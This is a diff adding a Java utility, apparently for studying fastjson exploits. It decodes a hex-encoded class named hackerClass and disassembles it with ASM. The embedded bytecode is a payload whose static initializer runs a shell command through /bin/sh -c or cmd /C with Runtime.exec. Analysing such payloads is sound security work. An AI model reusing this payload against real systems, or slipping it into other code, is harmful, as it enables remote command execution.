@@ -1,0 +1,54 @@
+package fastJsonHack;
+
+import org.objectweb.asm.util.TraceClassVisitor;
+import org.objectweb.asm.*;
+
+import javax.xml.bind.DatatypeConverter;
+import javax.xml.datatype.DatatypeConstants;
+import java.io.*;
+import java.util.Arrays;
+
+import java.io.PrintWriter;
+
+import static com.sun.xml.internal.messaging.saaj.util.Base64.base64Decode;
+
+public class classTranslation {
+    public static void main(String[] args) throws IOException {
+        String hexByteCode = "cafebabe0000003400400a0010002508002609002700280800290a0006002a07002b08002c08002d08001d08002e0a002f00300a002f00310700320a000d00330700340700350100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100154c7061796c6f61642f52756e74696d65457865633b0100083c636c696e69743e010004766172310100135b4c6a6176612f6c616e672f537472696e673b010004766172330100154c6a6176612f696f2f494f457863657074696f6e3b010003636d640100124c6a6176612f6c616e672f537472696e673b01000d537461636b4d61705461626c6507002b07001a07003201000a536f7572636546696c6501001052756e74696d65457865632e6a6176610c0011001201000579616b69740700360c0037001e0100012f0c003800390100106a6176612f6c616e672f537472696e670100072f62696e2f73680100022d630100022f4307003a0c003b003c0c003d003e0100136a6176612f696f2f494f457863657074696f6e0c003f001201000b6861636b6572436c6173730100106a6176612f6c616e672f4f626a65637401000c6a6176612f696f2f46696c65010009736570617261746f72010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010028285b4c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b01000f7072696e74537461636b54726163650021000f0010000000000002000100110012000100130000002f00010001000000052ab70001b10000000200140000000600010000000500150000000c00010000000500160017000000080018001200010013000000d3000400030000004812024bb200031204b6000599001906bd00065903120753590412085359052a534ca7001606bd000659031209535904120a5359052a534cb8000b2bb6000c57a700084d2cb6000eb100010037003f0042000d000300140000002600090000000700030009000e000a0024000c0037000f003f001200420010004300110047001300150000002a0004002100030019001a000100430004001b001c000200030044001d001e0000003700100019001a0001001f000000150004fc0024070020fc00120700214a070022f9000400010023000000020024";
+        byte[] bytecode = hexStringToByteArray(hexByteCode);
+
+
+
+        // 直接写入二进制字节码到 .class 文件
+        try (FileOutputStream fos = new FileOutputStream("./src/main/java/fastJsonHack/hackerClass.class")) {
+            fos.write(bytecode);
+            System.out.println("成功生成可反编译的 .class 文件");
+        }
+
+        try {
+            // 创建 ClassReader 对象来读取字节码
+            ClassReader classReader = new ClassReader(bytecode);
+            // 创建 TraceClassVisitor 对象，用于将字节码转换为文本形式
+            // 使用 try-with-resources 自动关闭文件流
+            try (PrintWriter fileWriter = new PrintWriter("./src/main/java/fastJsonHack/hackerClass.class.txt")) {
+                TraceClassVisitor traceVisitor = new TraceClassVisitor(fileWriter);
+                // 访问类的字节码
+                classReader.accept(traceVisitor, ClassReader.SKIP_DEBUG);
+                System.out.println("字节码已成功写入");
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    // 将十六进制字符串转换为字节数组的方法
+    public static byte[] hexStringToByteArray(String s) {
+        int len = s.length();
+        byte[] data = new byte[len / 2];
+        for (int i = 0; i < len; i += 2) {
+            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
+                    + Character.digit(s.charAt(i + 1), 16));
+        }
+        return data;
+    }
+}
